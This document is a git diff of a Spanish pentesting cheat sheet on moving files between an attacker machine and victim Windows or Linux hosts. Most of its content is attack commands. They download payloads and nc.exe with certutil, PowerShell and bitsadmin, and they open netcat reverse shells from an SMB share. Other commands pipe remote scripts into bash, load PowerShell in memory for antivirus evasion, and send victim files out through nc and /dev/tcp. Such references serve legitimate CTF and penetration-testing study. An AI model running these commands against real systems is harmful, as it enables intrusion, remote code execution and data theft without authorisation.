@@ -1,151 +1,274 @@
-# Transferir archivos 
+# Transferencia de Archivos
 
-Tags: #FileTransfer #LinuxtoWindows #LinuxtoLinux #Certutil #Python #Impacket #Scp #IEX #Bitsadmin
+Tags: #FileTransfer #LinuxToWindows #LinuxToLinux #WindowsToLinux #Certutil #Python #Impacket #SCP #IEX #Bitsadmin #NC #Base64
 
 [LOLBAS](https://lolbas-project.github.io/)
-## Linux a Windows 
 
-```bash 
-# Directorios en donde tienes los permisos de lectura y escritura en Windows 
+## TIPS
 
-C:\Temp
-C:\Windows\Temp                          
-```
+1. **Servidor HTTP Python → el método más rápido cuando hay conectividad HTTP**
+2. **SMB con impacket → mejor opción cuando HTTP está bloqueado**
+3. **Certutil → siempre disponible en Windows → no requiere herramientas extra**
+4. **IEX → ejecuta en memoria → no toca el disco → más sigiloso**
+5. **Base64 → útil cuando no hay conectividad de red → copiar/pegar por consola**
+6. **SCP → requiere SSH activo en destino y conocer credenciales**
 
-```bash 
-# Atacante Linux
-2. ❯ python -m SimpleHTTPServer 80      # Crear un servidor para tranferir archivos a Windows
+---
 
-3. ❯ python3 -m http.server 80          # Crear un servidor para tranferir archivos a Windows
-
-4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Crear un server para tranferir archivos a Windows
-```
-
-```bash 
-# Victima Windows 
-
-1 ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir
-
-2 ❯ certutil -urlcache -f http://IP/nc.exe nc.exe      # Descargar el payload de la maquina Linux
-	# IP = Direccion de la maquina de atacante Linux
-	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
-	
-3 ❯ certutil.exe -f -urlcache -split http://IP/nc.exe nc.exe   # Descargar el payload de la maquina Linux
-	# IP = Direccion de la maquina de atacante Linux
-	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
-
-3 ❯ powershell -c "Invoke-WebRequest http://IP/nc.exe -OutFile nc.exe"   # Descargar el payload de la maquina Linux
-	❯ nc.exe IP_Kali 443 -e cmd.exe   # Obtener la reverse shell 
-
-4 ❯ \\\\IP\smbFolder\nc.exe -e cmd IP 443      # Ejecutar una revershell con el binario 'Netcat'
-
-4 ❯ copy \\IP\smbFolder\File.exe File.exe      # Copiar un archivo desde un recurso compartido a Windows
-	# IP = IP de atacante
-	# smbFolder = Nombre del folder del recurso compartido
-	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
-	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
-
-4 ❯ copy File.exe \\IP\smbFolder\File.exe      # Copiar un archivo de Windows a Linux
-```
-
-## WinRM 
+## DIRECTORIOS CON ESCRITURA
 
 ```bash
-# En WinRm se puede usar el siguiente comando en la maquina victima sin necesidad de crear un recurso compartido en nuestra maquina de atacante 
+# Windows
+C:\Temp
+C:\Windows\Temp
+C:\ProgramData
+C:\Users\Public
 
-1. ❯ upload /ruta/absoluta/maquina/atacante/file.exe  # Cargar un archivo en la maquina victima Windows
-2. ❯ download data.zip data.zip        # Descargar un archivo desde la maquina victima Windows 
-
-3. ❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Cargar un script en memoria en la maquina victima Windows 
-```
-
-## Linux a Linux
-
-```bash 
-# Directorios en donde tienes los permisos de lectura y escritura en Linux 
-
-/var/tmp 
+# Linux
+/tmp
+/var/tmp
 /dev/shm
 ```
 
-```bash
-# Atacante Linux
+---
 
-1. ❯ python3 -m http.server 80          # Creamos un servidor para poder pasar los archivos a la maquina Linux
+## LINUX (ATACANTE) → WINDOWS (VÍCTIMA)
 
-2. ❯ nc -nlvp 443 > file.zip            # Se hace esto para descargar un archivo de la maquina victima con Netcat
-
-3. ❯ base64 -w 0 script.sh | xclip -sel clip      # Transferir un script cuando no existe nano, nvim, trasformamos a base64 y lo copiamos a la clipboard
-
-4. ❯ nc -nlvp 443 > file                # Recibir la data 
-```
-
-```bash 
-# Victima Linux
-
-1. ❯ wget http://IP/payload.sh              # Para descargar el payload de la maquina Linux
-
-2. ❯ nc IP 443 < File.zip                   # Para pasar un archivo a la maquina de atacante 
-
-3. ❯ echo abcdef | base64 -d > script.sh    # Pegamos el contenido anterior en 'base64', lo decodeamos y guardamos 
-
-4. ❯ cat < file.txt > /dev/tcp/IP/443        # Compartir un archivo 
-```
-
-## Compartir archivos en un SMB de Linux a Windows 
+### Atacante — Preparar servidor para enviar archivos
 
 ```bash
-❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 
+1. ❯ python3 -m http.server 80
+   # Servidor HTTP simple → servir archivos del directorio actual
 
-	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
-	# pwd = Sincronizado con la ruta absoluta actual 
-	# smb2support = En Windows 10 le damos soporte a la version 2
+2. ❯ python -m SimpleHTTPServer 80
+   # Python 2 → alternativa si python3 no está disponible
 
-❯ smbserver.py <FOLDERNAME> $(pwd)                 # Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
+3. ❯ impacket-smbserver smbFolder $(pwd) -smb2support
+   # Servidor SMB → mejor cuando HTTP está bloqueado en la víctima
+   # smb2support → soporte SMB2 para Windows 10+
+
+4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
+   # Con credenciales → cuando Windows bloquea conexiones SMB anónimas
+   # En Windows: net use \\IP\smbFolder /u:omar omar123
+
+5. ❯ php -S 0.0.0.0:80
+   # Servidor HTTP con PHP → alternativa a Python
 ```
 
-## Windows cmd a Linux 
+### Víctima Windows — Descargar desde Linux
 
-```bash 
-# En Windows
-# En el 'cmd' de la maquina Windows debemos colocar estos comandos
+```bash
+1. ❯ upload ~/Downloads/file.exe
+   # Solo en sesión Meterpreter → ruta absoluta del archivo en Kali
 
-1. ❯ scp -r File user@IP:dir/destino/            # Pasar una carpeta con muchos archivos a Linux
-   ❯ scp file.exe user@IP:/dir/destino/          # Pasar un archivo en especifico a Linux
+2. ❯ certutil -urlcache -f http://<IP>/nc.exe nc.exe
+   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe nc.exe
+   # Certutil → siempre disponible en Windows → muy fiable
 
-	# r = Recursivo
-	# File = Nombre de la carpeta que contiene los archivos a pasar  
-	# user = Usuario de la maquina Linux (Debemos conocer su passwd)
-	# dir = Directorio en donde se colocara el archivo 
+3. ❯ powershell -c "Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe"
+   ❯ powershell -c "IWR http://<IP>/nc.exe -OutFile nc.exe"
+   ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','nc.exe')"
+   # PowerShell → varias alternativas si una falla
 
-2. ❯ scp user@IP:/dir/destino/ .    # Copiar un archivo que se encuentra en la maquina Linux a Windows    
+4. ❯ copy \\<IP>\smbFolder\File.exe File.exe
+   # Copiar archivo desde SMB de Kali a Windows
+   ❯ \\<IP>\smbFolder\nc.exe -e cmd <IP> 443
+   # Ejecutar directamente desde el SMB sin copiar al disco
 
-3. ❯ python3 -m http.server 80      # Creamos un servidor 
+5. ❯ bitsadmin /transfer job http://<IP>/nc.exe C:\Temp\nc.exe
+   # BITS → descarga en segundo plano → a veces evita restricciones
 
-4. ❯ copy \\IP_Kali\smbFolder\file.exe      # Copiar de Kali a Windows 
-   ❯ copy .\file.exe \\IP_Kali\smbFolder\   # Copiar de Windows a Kali
-
-5. ❯ net use \\IP_Kali\smbFolder /u:omar omar123
-   ❯ dir \\IP_Kali\smbFolder\             # Listar lo que hay en Kali 
-   ❯ copy file.exe \\IP_Kali\smbFolder\   # Copiar de Windows a Kali
+6. ❯ certutil -decode input.b64 output.exe
+   # Decodificar archivo base64 → útil cuando solo puedes copiar texto
 ```
 
-```bash 
-# En linux
-3. ❯ http://IP    # Ingresar desde el navegador web, colocar la IP que se esta compartiendo y descargar el recurso  
+---
 
-# Recurso compartido para compartir o recibir un archivo 
-4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support  
+## LINUX (ATACANTE) → LINUX (VÍCTIMA)
 
-# Cuando exista un error por políticas en Windows agregar credenciales 
-5. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123  
+### Atacante — Preparar servidor para enviar archivos
+
+```bash
+1. ❯ python3 -m http.server 80
+   # Servidor HTTP → método más común
+
+2. ❯ nc -nlvp 443 > file_recibido.zip
+   # Recibir archivo de la víctima vía netcat
+
+3. ❯ base64 -w 0 script.sh | xclip -sel clip
+   # Copiar script en base64 al portapapeles
+   # → pegar directamente en la consola de la víctima
+
+4. ❯ nc -nlvp 443 > file
+   # Recibir data de la víctima
 ```
 
-## Certutil 
+### Víctima Linux — Descargar desde Kali
 
-```bash 
-# Codifica y decodifica archivos en base64 
-❯ certutil -decode input.txt output.txt      # Decodificar un archivo 
+```bash
+1. ❯ wget http://<IP>/payload.sh
+   ❯ wget http://<IP>/linpeas.sh -O /tmp/linpeas.sh
+   # wget → el más común en Linux
 
-❯ certutil -urlcache -f https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe C:\Users\Public\PetitPotato.exe              # Descargar un archivo directamente desde la url y se coloca en una ruta especifica en la maquina victima 
+2. ❯ curl http://<IP>/payload.sh -o payload.sh
+   ❯ curl http://<IP>/payload.sh | bash
+   # curl → ejecutar directamente en memoria con pipe a bash
+
+3. ❯ echo <base64_string> | base64 -d > script.sh
+   # Decodificar base64 pegado directamente en la consola
+   # Útil cuando no hay conectividad de red
+
+4. ❯ nc <IP_KALI> 443 < File.zip
+   # Enviar archivo a Kali vía netcat
+
+5. ❯ cat < file.txt > /dev/tcp/<IP_KALI>/443
+   # Enviar archivo usando /dev/tcp → sin netcat
+
+6. ❯ scp file.txt user@<IP_KALI>:/tmp/
+   # SCP → requiere SSH en Kali y credenciales
+```
+
+---
+
+## WINDOWS (VÍCTIMA) → LINUX (ATACANTE)
+
+### Víctima Windows — Enviar a Kali
+
+```bash
+1. ❯ scp -r C:\Carpeta user@<IP_KALI>:/tmp/destino/
+   ❯ scp C:\archivo.exe user@<IP_KALI>:/tmp/destino/
+   # SCP → requiere SSH activo en Kali y credenciales del usuario Linux
+   # -r → recursivo para carpetas
+
+2. ❯ copy .\file.exe \\<IP_KALI>\smbFolder\
+   # Copiar de Windows a Kali via SMB
+   # Kali debe tener impacket-smbserver activo
+
+3. ❯ net use \\<IP_KALI>\smbFolder /u:omar omar123
+   ❯ dir \\<IP_KALI>\smbFolder\
+   ❯ copy file.exe \\<IP_KALI>\smbFolder\
+   # Montar SMB con credenciales → luego copiar
+
+4. ❯ powershell -c "Invoke-WebRequest -Uri http://<IP_KALI>/upload -Method POST -InFile C:\archivo.txt"
+   # POST upload a servidor HTTP de Kali
+```
+
+### Atacante Kali — Recibir desde Windows
+
+```bash
+1. ❯ impacket-smbserver smbFolder $(pwd) -smb2support
+   # SMB anónimo → Windows 7/8
+
+2. ❯ impacket-smbserver smbFolder $(pwd) -smb2support -username omar -password omar123
+   # SMB con credenciales → Windows 10/11 (bloquea anónimo por defecto)
+
+3. ❯ python3 -m http.server 80
+   # Si Windows hace GET/POST al servidor de Kali
+
+4. ❯ nc -nlvp 443 > archivo_recibido.exe
+   # Recibir via netcat → en Windows usar nc.exe < archivo.exe
+```
+
+---
+
+## WINRM / EVIL-WINRM
+
+```bash
+# Dentro de sesión evil-winrm → comandos integrados
+
+1. ❯ upload /ruta/en/kali/file.exe
+   # Subir archivo de Kali a la víctima Windows
+   # No necesita servidor HTTP ni SMB
+
+2. ❯ download C:\ruta\archivo.zip ./archivo_local.zip
+   # Descargar archivo de la víctima a Kali
+
+3. ❯ IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
+   # Cargar y ejecutar script PowerShell en memoria
+   # No toca el disco → más sigiloso → útil para AV evasion
+```
+
+---
+
+## METERPRETER
+
+```bash
+1. ❯ upload /ruta/kali/file.exe C:\Temp\file.exe
+   # Subir archivo a la víctima
+
+2. ❯ download C:\Temp\archivo.zip /ruta/kali/
+   # Descargar archivo de la víctima
+
+3. ❯ shell
+   # Obtener shell del sistema → luego usar certutil/powershell
+```
+
+---
+
+## CERTUTIL — REFERENCIA COMPLETA
+
+```bash
+# Descargar archivo desde URL
+❯ certutil -urlcache -f http://<IP>/archivo.exe C:\Temp\archivo.exe
+❯ certutil.exe -f -urlcache -split http://<IP>/archivo.exe C:\Temp\archivo.exe
+
+# Descargar desde URL directa (GitHub releases, etc.)
+❯ certutil -urlcache -f https://github.com/user/repo/releases/download/v1.0/tool.exe C:\Users\Public\tool.exe
+
+# Codificar archivo a base64 (para transferir por consola)
+❯ certutil -encode input.exe output.b64
+
+# Decodificar archivo desde base64
+❯ certutil -decode input.b64 output.exe
+
+# Calcular hash de un archivo (verificar integridad)
+❯ certutil -hashfile archivo.exe MD5
+❯ certutil -hashfile archivo.exe SHA256
+```
+
+---
+
+## BASE64 — TRANSFERENCIA SIN RED
+
+```bash
+# Cuando no hay conectividad HTTP/SMB → transferir copiando texto
+
+# En Kali → codificar
+❯ base64 -w 0 archivo.sh
+❯ base64 -w 0 archivo.exe | xclip -sel clip
+# -w 0 → sin saltos de línea → más fácil de copiar
+
+# En la víctima Linux → decodificar
+❯ echo <base64_string> | base64 -d > archivo.sh
+❯ chmod +x archivo.sh
+
+# En la víctima Windows → decodificar con certutil
+❯ echo <base64_string> > archivo.b64
+❯ certutil -decode archivo.b64 archivo.exe
+
+# Desde Windows a Kali → codificar en PowerShell
+❯ [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\archivo.exe'))
+# Copiar el output → en Kali: echo <string> | base64 -d > archivo.exe
+```
+
+---
+
+## SCP — REFERENCIA COMPLETA
+
+```bash
+# Linux → Linux
+❯ scp archivo.txt user@<IP>:/tmp/
+❯ scp -r directorio/ user@<IP>:/tmp/
+
+# Windows → Linux (desde CMD/PowerShell)
+❯ scp C:\archivo.exe user@<IP_KALI>:/tmp/
+❯ scp -r C:\Carpeta user@<IP_KALI>:/tmp/destino/
+# -r → recursivo
+
+# Linux → Windows (desde Kali)
+❯ scp archivo.exe user@<IP_WIN>:C:\Temp\
+
+# Copiar desde Linux a Kali
+❯ scp user@<IP>:/ruta/archivo.txt .
+# . → directorio actual de Kali
 ```
